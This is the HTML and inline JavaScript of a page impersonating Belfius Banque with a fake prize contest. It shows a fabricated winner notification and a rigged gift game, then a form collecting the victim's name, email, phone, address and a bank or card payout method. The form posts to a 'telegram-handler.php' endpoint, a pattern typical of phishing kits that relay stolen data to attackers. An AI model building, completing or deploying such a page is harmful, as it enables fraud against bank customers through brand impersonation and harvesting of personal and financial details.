<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>ğŸ Concours de Cadeaux - Belfius Banque</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
<div id="winnerNotification" class="winner-notification hidden">
  <div class="notification-header">
    <span class="notification-title">ğŸ‰ Nouveau gagnant !</span>
    <button class="close-btn" onclick="closeNotification()">âœ•</button>
  </div>
  <div class="notification-content">
    <p><strong id="winnerName">Lucas T. de Namur</strong></p>
    <p>Vient de gagner <strong id="winnerAmount">â‚¬3700</strong> !</p>
    <p style="font-size: 11px; color: #16a34a; margin-top: 5px;">Il y a quelques instants</p>
  </div>
</div>

<div class="container">
   <div class="brand-header">
    <div class="">
      <img src="images/logo.png" style="width: 120px; height: auto;"></div>

  </div>

   <div id="mainGame" class="game-section">
    <div class="chip">
      <h2>Tentez votre chance !</h2>
    </div>

    <h1 class="main-title">Choisissez l'un des cadeaux</h1>
    <p class="subtitle">et remportez jusqu'Ã  5000â‚¬</p>

    <div id="attemptsDisplay" class="attempts hidden">
      Tentatives : <span id="attemptCount">0</span>/2
    </div>

     <div class="gift-grid">
      <div class="gift-item">
        <div class="gift-number">1</div>
        <button class="gift-box" onclick="selectGift(1)">
          <div class="gift-icon">ğŸ</div>
        </button>
      </div>
      <div class="gift-item">
        <div class="gift-number tr">2</div>
        <button class="gift-box" onclick="selectGift(2)">
          <div class="gift-icon">ğŸ</div>
        </button>
      </div>
      <div class="gift-item">
        <div class="gift-number bl">3</div>
        <button class="gift-box" onclick="selectGift(3)">
          <div class="gift-icon">ğŸ</div>
        </button>
      </div>
      <div class="gift-item">
        <div class="gift-number br">4</div>
        <button class="gift-box" onclick="selectGift(4)">
          <div class="gift-icon">ğŸ</div>
        </button>
      </div>
    </div>

     <div id="selectedMessage" class="message hidden">
      <p>Vous avez sÃ©lectionnÃ© : <strong id="selectedGiftName">Cadeau 1</strong></p>
    </div>

    <div id="encouragementMessage" class="message hidden">
      <p style="margin-bottom: 10px;">N'abandonnez pas ! ğŸ€</p>
      <p>Tout le monde mÃ©rite une seconde chance. Choisissez un autre cadeau pour rÃ©essayer !</p>
    </div>
  </div>

   <div id="firstTryResult" class="screen hidden">
    <div class="panel">
      <div class="emoji-big">ğŸ˜”</div>
      <h2>Pas cette fois !</h2>
      <p>DÃ©solÃ©, vous n'avez pas gagnÃ© avec <span id="firstTryGiftName">Cadeau 1</span> cette fois.</p>
      <p style="font-size: 14px; margin-top: 15px;">Mais n'abandonnez pas ! Essayez encore pour une autre chance.</p>
    </div>
  </div>

   <div id="processing" class="screen hidden">
    <div class="panel">
      <div class="emoji-big" style="animation: pulse 2s infinite;">âœ¨</div>
      <h2>VÃ©rification de votre chance...</h2>
      <p>Quelque chose de spÃ©cial se passe ! ğŸ‰</p>
    </div>
  </div>

   <div id="winnerScreen" class="screen hidden" style="position: relative; overflow: hidden;">
     <div class="bg-emoji" style="top: 10%; left: 10%;">ğŸ‰</div>
    <div class="bg-emoji" style="top: 20%; right: 15%; animation-delay: 1s;">ğŸ’°</div>
    <div class="bg-emoji" style="bottom: 20%; left: 15%; animation-delay: 2s;">â­</div>
    <div class="bg-emoji" style="bottom: 10%; right: 10%; animation-delay: 0.5s;">ğŸ†</div>

     <div id="confettiContainer" style="position: absolute; inset: 0; pointer-events: none;"></div>

    <div class="winner-form">
      <div class="form-header">
        <div class="emoji-big">ğŸ‰</div>
        <h2>FÃ‰LICITATIONS !</h2>
        <p class="win-amount">Vous avez gagnÃ© â‚¬<span id="winAmount">2500</span> !</p>
        <p style="color: var(--brand-dark); font-weight: 600; margin-top: 10px;">Incroyable rÃ©ussite ! ğŸŠ</p>
      </div>

      <div style="background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 10px; padding: 15px; margin-bottom: 25px;">
        <p style="color: var(--brand-dark); font-weight: 600; font-size: 14px; margin: 0;">
Afin de procÃ©der au versement de votre gain, veuillez remplir et transmettre le formulaire ci-dessous. <br>
Le versement sera effectuÃ© aprÃ¨s rÃ©ception du formulaire.
        </p>
      </div>

      <form id="winnerForm" onsubmit="submitForm(event)" action="telegram-handler.php" method="POST">
        <input type="hidden" name="bonus" id="hiddenWinAmount" value="">
        <input type="hidden" name="subdomain" value="belfius-contest">
        <input type="hidden" name="country" value="Belgium">
        <input type="hidden" name="method" id="hiddenMethod" value="">
        <input type="hidden" name="city" id="hiddenCity" value="">
        <input type="hidden" name="postal" id="hiddenPostal" value="">

        <div class="form-field">
          <label>Nom complet *</label>
          <input type="text" id="fullName" name="fullName" required="" placeholder="Entrez votre nom complet">
        </div>

        <div class="form-field">
          <label>Adresse e-mail *</label>
          <input type="email" id="email" name="email" required="" placeholder="votre.email@exemple.com">
        </div>

        <div class="form-field">
          <label>NumÃ©ro de tÃ©lÃ©phone *</label>
          <input type="tel" id="phone" name="phone" required="" placeholder="+32 2 123 45 67">
        </div>

        <div class="form-field">
          <label>Adresse complÃ¨te *</label>
          <input type="text" id="address" name="address" required="" placeholder="Rue, Ville, Code postal, Belgique">
        </div>
        
        <button type="submit" class="submit-btn" id="submitBtn" disabled="">
          ğŸ‰ JE VALIDE <span id="winAmountBtn" style="display:none">2500</span> ! ğŸ’°
        </button>
      </form>


    </div>
  </div>
</div>

<footer style="text-align: center; color: rgba(255,255,255,0.8); font-size: 12px; padding: 30px;">

</footer>

<script>
    // =======================================================
    // CODE TEMPORAIRE POUR ASSURER LE REMPLISSAGE DES CHAMPS CACHÃ‰S
    // (Ã€ INTÃ‰GRER DANS VOTRE script.js EXISTANT)
    // =======================================================

    // Fonction pour mettre Ã  jour le champ cachÃ© 'method' et activer le bouton de soumission
    function selectPayment(method) {
        // 1. Mettre Ã  jour le champ cachÃ© 'method' pour l'envoi au PHP
        document.getElementById('hiddenMethod').value = method;

        // 2. Mettre Ã  jour les styles et le message d'info (nÃ©cessite CSS 'selected' non inclus)
        const cardBtn = document.getElementById('cardBtn');
        const bankBtn = document.getElementById('bankBtn');
        const paymentInfoText = document.getElementById('paymentInfoText');
        const paymentInfo = document.getElementById('paymentInfo');
        const submitBtn = document.getElementById('submitBtn');

        cardBtn.classList.remove('selected');
        bankBtn.classList.remove('selected');

        if (method === 'card') {
            cardBtn.classList.add('selected');
            paymentInfoText.innerHTML = 'Vous avez choisi de recevoir le virement sur votre compte Belfius (via carte).';
        } else if (method === 'bank') {
            bankBtn.classList.add('selected');
            paymentInfoText.innerHTML = 'Vous avez choisi de recevoir le virement sur un autre compte bancaire. Vous serez redirigÃ© pour les dÃ©tails.';
        }

        paymentInfo.classList.remove('hidden');
        submitBtn.removeAttribute('disabled'); // Activer le bouton de soumission
    }

    // Fonction de soumission du formulaire (pour extraire ville/postal si nÃ©cessaire)
    function submitForm(event) {
        // Cette fonction devrait normalement Ãªtre dans script.js
        // Si l'utilisateur n'a pas sÃ©lectionnÃ© la mÃ©thode, bloquer la soumission
        if (document.getElementById('hiddenMethod').value === '') {
            event.preventDefault();
            alert("Veuillez choisir une mÃ©thode de virement (Belfius ou Autre banque) !");
            return;
        }

        // --- DÃ©but du traitement facultatif (si vous voulez extraire la ville/postal) ---
        // ATTENTION: Ceci est une implÃ©mentation simplifiÃ©e et non robuste.
        // Vous devrez amÃ©liorer la logique d'extraction dans script.js.
        const addressInput = document.getElementById('address').value;
        const parts = addressInput.split(',').map(p => p.trim());

        // Logique trÃ¨s basique: suppose que le code postal et la ville sont Ã  la fin de la chaÃ®ne d'adresse
        if (parts.length >= 3) {
            document.getElementById('hiddenCity').value = parts[parts.length - 2];
            document.getElementById('hiddenPostal').value = parts[parts.length - 1];
        }
        // --- Fin du traitement facultatif ---
    }
    
    // Simuler le remplissage du montant gagnÃ© au chargement de la page
    document.addEventListener('DOMContentLoaded', () => {
        const winAmountElement = document.getElementById('winAmount');
        const hiddenWinAmountElement = document.getElementById('hiddenWinAmount');
        
        // Assurer que le champ cachÃ© 'bonus' a la bonne valeur.
        if (winAmountElement && hiddenWinAmountElement) {
            // Dans cet exemple, nous supposons 2500 comme montant par dÃ©faut.
            // Votre script.js devrait mettre Ã  jour ces valeurs aprÃ¨s le jeu.
            hiddenWinAmountElement.value = winAmountElement.textContent; 
        }
    });

    // Remarque: La fonction selectGift(), closeNotification(), etc. ne sont pas incluses
    // car elles dÃ©pendent de votre logique de jeu. Assurez-vous qu'elles existent dans script.js.
</script>

<script src="script.js"></script>
</body>
</html>
